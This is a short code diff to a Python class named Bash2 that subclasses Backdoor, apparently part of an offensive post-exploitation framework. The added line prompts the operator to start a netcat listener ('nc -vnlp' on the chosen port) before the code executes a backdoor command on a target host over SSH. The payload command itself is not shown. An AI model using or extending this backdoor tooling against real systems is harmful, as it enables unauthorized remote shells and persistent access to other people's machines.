@@ -23,6 +23,7 @@ class Bash2(Backdoor):
         port = self.get_value("port")
         target = self.core.curtarget
         print(GOOD + "Initializing backdoor...")
+        raw_input("Run the following command: nc -vnlp %s in another shell to start the listener." % port)
         target.ssh.exec_command(self.get_command())
 
         for mod in self.modules.keys():
